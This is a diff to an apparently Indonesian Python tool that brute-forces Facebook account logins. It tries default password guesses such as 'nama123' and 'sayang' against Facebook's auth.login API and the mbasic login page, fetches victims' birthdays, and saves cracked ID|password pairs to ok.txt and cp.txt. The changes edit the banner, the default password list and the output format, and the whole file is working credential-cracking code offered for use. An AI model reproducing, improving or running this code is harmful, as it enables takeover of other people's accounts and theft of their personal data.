@@ -211,7 +211,7 @@ def menu():
     ip = requests.get("https://api.ipify.org").text
     os.system("clear")
     banner()
-    print("⭐⭐⭐"+h+"ROY-VIP SC s7i Opera Mini⭐⭐⭐")
+    print("⭐⭐⭐"+h+"ROY-VIP SC Mbasic Metode⭐⭐⭐")
     print((p+"================================================="))
     print((p+"["+o+"⭐"+p+"]"+p+" Author	: "+k+"Roy Octa Firdaus"))
     print((p+"["+o+"⭐"+p+"]"+p+" Facebook	: "+k+"facebook.com/JbFbOld"))
@@ -431,10 +431,10 @@ def brute(user, passs):
       api='https://b-api.facebook.com/method/auth.login'
       response=requests.get(api, params=params)
       if re.search('(EAAA)\w+', str(response.text)):
-        print('\x1b[0;32m[\x1b[0;37mVIP-OK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
+        print('\x1b[0;32mID : %s|%s '%(str(user), str(pw)))
         break
       elif 'www.facebook.com' in response.json()['error_msg']:
-        print('\x1b[0;33m[\x1b[0;37mVIP-CP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
+        print('\x1b[0;33mID : %s|%s '%(str(user), str(pw)))
         break
   except: pass
 
@@ -581,7 +581,7 @@ class crack:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((p+"\n["+h+"✔"+p+"]"+p+" Kata Sandi Default : "+k+"nama,nama123,nama12345"))
+		print((p+"\n["+h+"✔"+p+"]"+p+" Kata Sandi Default : "+k+"sayang,nama123,nama12345"))
 		print((p+"["+k+"⭐"+p+"]"+p+" Crack Dengan Kata Sandi Default/Manual [d/m]?"))
 		while True:
 			f=input(p+"\n["+k+"❓"+p+"]"+p+" Pilih :"+k+" ")
@@ -646,16 +646,16 @@ class crack:
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="cp":
-					print(("\r\x1b[0;33m[\x1b[0;37mVIP-CP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
-					self.cp.append("%s • %s"%(fl.get("id"),i))
+					print(("\r\x1b[0;33mID : %s|%s               "%(fl.get("id"),i)))
+					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+						"%s|%s\n"%(fl.get("id"),i))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mVIP-OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
-					self.ada.append("%s • %s"%(fl.get("id"),i))
+					print(("\r\x1b[0;32mID : %s|%s               "%(fl.get("id"),i)))
+					self.ada.append("%s|%s"%(fl.get("id"),i))
 					open("ok.txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+						"%s|%s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
@@ -671,7 +671,7 @@ class crackttl:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print((p+"\n["+h+"✔"+p+"]"+p+" Kata Sandi Default : "+k+"nama,nama123,nama12345"))
+		print((p+"\n["+h+"✔"+p+"]"+p+" Kata Sandi Default : "+k+"sayang,nama123,nama12345"))
 		print((p+"["+k+"⭐"+p+"]"+p+" Crack Dengan Kata Sandi Default/Manual [d/m]?"))
 		while True:
 			f=input(p+"\n["+k+"❓"+p+"]"+p+" Pilih :"+k+" ")
@@ -741,19 +741,19 @@ class crackttl:
 						tt=json.loads(ke.text)
 						ttl=tt["birthday"]
 					except:pass
-					print(("\r\x1b[0;33m[\x1b[0;37mVIP-CP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
-					self.cp.append("%s • %s"%(fl.get("id"),i))
+					print(("\r\x1b[0;33mID : %s|%s|%s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
+					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
-						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
+						"%s|%s|%s\n"%(fl.get("id"),i,str(ttl)))
 					break
 				elif log.get("status")=="success":
-					print(("\r\x1b[0;32m[\x1b[0;37mVIP-OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
-					self.ada.append("%s • %s"%(fl.get("id"),i))
+					print(("\r\x1b[0;32mID : %s|%s               "%(fl.get("id"),i)))
+					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
 					else:
 						open("ok.txt","a+").write(
-						"%s • %s\n"%(fl.get("id"),i))
+						"%s|%s\n"%(fl.get("id"),i))
 					break
 				else:continue
 					
@@ -776,7 +776,7 @@ def results(Dapunta,Krahkrah):
 def ress():
     os.system("clear")
     banner()
-    print("["+h+"ROY-VIP SC s7i Opera Mini]")
+    print("["+h+"ROY-VIP SC Mbasic Motode]")
     print((p+"================================================="))
     print((p+"["+o+"⭐"+p+"]"+p+" Author	: "+k+"Roy Octa Firdaus"))
     print((p+"["+o+"⭐"+p+"]"+p+" Facebook	: "+k+"facebook.com/jbfbold"))
